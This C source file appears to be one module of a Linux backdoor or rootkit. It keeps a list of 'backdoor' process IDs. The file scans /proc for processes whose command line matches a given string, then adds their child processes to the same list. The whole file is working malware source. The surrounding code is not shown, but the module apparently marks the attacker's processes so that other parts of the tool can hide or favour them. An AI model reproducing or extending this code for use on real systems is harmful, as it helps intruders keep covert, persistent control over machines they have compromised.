#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>

#include "backdoor.h"
#include "util.h"

void backdoor_init(backdoor_t *b) {
  if (NULL == b)
    return;
  bzero(b, sizeof(backdoor_t));
}

void backdoor_destroy(backdoor_t *b) {
  if (NULL == b)
    return;
  free(b->pids);
}

bool backdoor_add(backdoor_t *b, pid_t pid) {
  if (NULL == b)
    return false;

  if (NULL == b->pids)
    b->pids = malloc(sizeof(pid_t) * (++b->count));
  else
    b->pids = realloc(b->pids, sizeof(pid_t) * (++b->count));

  debug("added a new PID: %d", pid);
  b->pids[b->count - 1] = pid;

  return true;
}

bool backdoor_contains(backdoor_t *b, pid_t pid) {
  for (uint64_t i = 0; i < b->count; i++)
    if (b->pids[i] == pid)
      return true;
  return false;
}

bool backdoor_find(backdoor_t *b, char *cmd) {
  if (NULL == b)
    return false;

  if (NULL == cmd)
    return true;

  /*

   * simply goes over /proc, and grabs all the processes
   * then compares the "cmd" with the processes' cmdline
   * if it matches then it adds it to the backdoor list

   * then it checks the PPID of all the processes and adds
   * them to the list as well if their PPID is in the list

  */
  size_t         cmdline_len = 256, cmd_len = strlen(cmd);
  struct dirent *entry = NULL;
  FILE          *cur   = NULL;
  DIR           *proc  = NULL;
  pid_t          cpid = 0, ppid = 0;

  if (cmdline_len < cmd_len)
    cmdline_len = cmd_len + 1;

  char cmdline[cmdline_len];
  bzero(cmdline, sizeof(cmdline));

  if (NULL == (proc = opendir("/proc"))) {
    debug("failed to open /proc");
    return false;
  }

  while (NULL != (entry = readdir(proc))) {
    if (entry->d_type != DT_DIR)
      continue;

    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
      continue;

    if (backdoor_contains(b, (cpid = atoi(entry->d_name))))
      continue;

    char cmdline_path[strlen(entry->d_name) + 16];
    sprintf(cmdline_path, "/proc/%s/cmdline", entry->d_name);

    if (NULL == (cur = fopen(cmdline_path, "r")))
      continue;

    cmdline_len = fread(cmdline, 1, sizeof(cmdline) - 1, cur);
    fclose(cur);

    replace(cmdline, 0, ' ', cmdline_len);
    cmdline[cmdline_len] = 0;

    if (strstr(cmdline, cmd) == NULL)
      continue;

    backdoor_add(b, cpid);
  }

  rewinddir(proc);

  while (NULL != (entry = readdir(proc))) {
    if (entry->d_type != DT_DIR)
      continue;

    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
      continue;

    if (backdoor_contains(b, (cpid = atoi(entry->d_name))))
      continue;

    char stat_path[strlen(entry->d_name) + 16];
    sprintf(stat_path, "/proc/%s/stat", entry->d_name);

    if (NULL == (cur = fopen(stat_path, "r")))
      continue;

    fscanf(cur, "%*d %*s %*s %d", &ppid);
    fclose(cur);

    if (backdoor_contains(b, ppid))
      backdoor_add(b, cpid);
  }

  closedir(proc);
  b->loaded = true;
  return true;
}
